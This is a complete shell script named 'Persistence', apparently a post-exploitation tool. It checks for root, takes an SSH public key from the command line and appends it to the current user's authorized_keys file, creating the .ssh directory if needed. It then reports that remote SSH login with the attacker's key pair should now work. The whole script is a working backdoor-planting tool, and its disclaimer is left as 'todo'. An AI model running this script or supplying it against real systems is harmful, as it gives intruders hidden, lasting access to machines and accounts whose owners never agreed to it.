#!/bin/sh
# Persistence

####################
# Global variables #
####################

# colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC="\033[0m" # No Color
# bold
BRED='\033[1;31m'
BGREEN='\033[1;32m'
BYELLOW='\033[1;33m'
BBLUE='\033[1;34m'
# text
BOLD=$(tput bold)
NORMAL='\033[0;39m'

#############
# Functions #
#############

# Print banner
fuBANNER() {
# http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something
echo "
  ____   _____  ____   ____  ___  ____  _____  _____  _   _   ____  _____ 
 |  _ \ | ____||  _ \ / ___||_ _|/ ___||_   _|| ____|| \ | | / ___|| ____|
 | |_) ||  _|  | |_) |\___ \ | | \___ \  | |  |  _|  |  \| || |    |  _|  
 |  __/ | |___ |  _ <  ___) || |  ___) | | |  | |___ | |\  || |___ | |___ 
 |_|    |_____||_| \_\|____/|___||____/  |_|  |_____||_| \_| \____||_____|
                                                                         
"
}

# Print output title
fuTITLE() {
  echo
  echo "$BBLUE════════════════════════════════════════════════════════════════════════"
  echo "$BGREEN $1 $BBLUE"
  echo "════════════════════════════════════════════════════════════════════════$NC"
}

# Print info line
fuINFO() {
  echo
  echo "$BBLUE═══$BGREEN $1 $NC"
}

# Print error line
fuERROR() {
  echo
  echo "$BBLUE═══$BRED $1 $NC"
}

# Print results line
fuRESULT() {
  echo
  echo "$BBLUE═══$BYELLOW $1 $NC"
}

# Print message line
fuMESSAGE() {
  echo "$BBLUE---$NC $1 $NC"
}

# Check for root permissions
fuGOT_ROOT() {
fuINFO "Checking for root"
if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
  IAMROOT="1"
  fuMESSAGE "You are root"
  echo
else
  IAMROOT=""
  fuMESSAGE "You are not root"
  echo
fi
}

#####################################
# Check the command line parameters #
#####################################

PASSED_ARGS=$@
if [ "$PASSED_ARGS" != "" ]; then
  while getopts "hs:" opt; do
    case "$opt" in
      h|\?)
        echo
        echo "Usage: $0 [-h] [-s]"
        echo
        echo "-s <SSH public key>"
        echo "  Trying to add ssh public key to authorized_keys"
        echo
        exit;;
      s) SSH="1";PUBKEY=$OPTARG;;
      esac
  done
else
  echo "$0: no arguments passed to script. Try -h for help."
  echo
  exit
fi

# validate OPTARG 
# todo

#if [ "$PUBKEY" != "" ]; then
#  if [ "$(head -n 1 $myCONF_FILE | grep -c "# exploitation")" == "1" ]; then
#    echo "OK"
#  else
#	  echo "Aborting. Config file \"$myCONF_FILE\" not a exploitation configuration file."
#    echo
#    exit
#fi

##########
# Banner #
##########

fuBANNER
echo
echo "Disclaimer: $RED todo $NC"
echo
sleep 1

#####################
# Checking for root #
#####################

fuGOT_ROOT
sleep 1

############
# SSH Keys #
############

# check if $HOME variable is set
USER=$(whoami 2>/dev/null || echo "User is unknown")
if [ ! "$HOME" ]; then
  if [ -d "/home/$USER" ];
    then HOME="/home/$USER";
  fi
fi

if [ "$SSH" ]; then
  echo "
    __  __           _ _  __         ____ ____  _   _   _  __                      
   |  \/  | ___   __| (_)/ _|_   _  / ___/ ___|| | | | | |/ /___ _   _ ___         
   | |\/| |/ _ \ / _\` | | |_| | | | \___ \___ \| |_| | | ' // _ \ | | / __|        
   | |  | | (_) | (_| | |  _| |_| |  ___) |__) |  _  | | . \  __/ |_| \__ \  _ _ _ 
   |_|  |_|\___/ \__,_|_|_|  \__, | |____/____/|_| |_| |_|\_\___|\__, |___/ (_|_|_)
                             |___/                               |___/             
  "
  sleep 1

  # check if $HOME variable is set
  USER=$(whoami 2>/dev/null || echo "User is unknown")
  if [ ! "$HOME" ]; then
    if [ -d "/home/$USER" ];
        then HOME="/home/$USER";
    fi
  fi

  current_user=$(whoami 2>/dev/null)

  if [ "$PUBKEY" != "" ]; then
    fuTITLE "Trying to add given SSH public key to authorized_keys file of user $current_user ..."
    if [ -d "$HOME/.ssh" ]; then
      if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then TRYCHMOD=""; else fuERROR "unable to write authorized_keys" && TRYCHMOD="1"; fi
      if [ "$TRYCHMOD" ]; then
        CHMOD=$(command -v chmod 2>/dev/null) || fuERROR "command \"chmod\" not found"
        $CHMOD 700 "$HOME"/.ssh 2>/dev/null
        echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys && SSHOK="1" && fuMESSAGE "authorized_keys updated"
      else
        SSHOK="1" && echo "authorized_keys updated"
      fi
    else
      fuINFO "No .ssh directory exists, creating one ..."
      MKDIR=$(command -v mkdir 2>/dev/null) || fuERROR "command \"mkdir\" not found"
      CHMOD=$(command -v chmod 2>/dev/null) || fuERROR "command \"chmod\" not found"
      $MKDIR "$HOME"/.ssh 2>/dev/null && $CHMOD 700 "$HOME"/.ssh 2>/dev/null
      if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then SSHOK="1" && fuMESSAGE "authorized_keys updated"; else SSHOK="" && fuERROR "unable to write authorized_keys"; fi
    fi
  else
    fuERROR "No public key given."
  fi
fi

##############
# Next Steps #
##############

if [ "$SSH" ]; then
  
  echo "
    _   _           _     ____  _                   _____       ____                
   | \ | | _____  _| |_  / ___|| |_ ___ _ __  ___  |_   _|__   |  _ \  ___          
   |  \| |/ _ \ \/ / __| \___ \| __/ _ \ '_ \/ __|   | |/ _ \  | | | |/ _ \         
   | |\  |  __/>  <| |_   ___) | ||  __/ |_) \__ \   | | (_) | | |_| | (_) |  _ _ _ 
   |_| \_|\___/_/\_\ __| |____/ \__\___| .__/|___/   |_|\___/  |____/ \___/  (_|_|_)
                                       |_|                                          
  "
  sleep 1

  if [ "$SSHOK" ]; then
    fuMESSAGE "authorized_key file updated, remote ssh login should be possible to user $current_user with given SSH key pair."
    echo
  else
    fuERROR "Modify SSH keys was not successful"
    echo
  fi

fi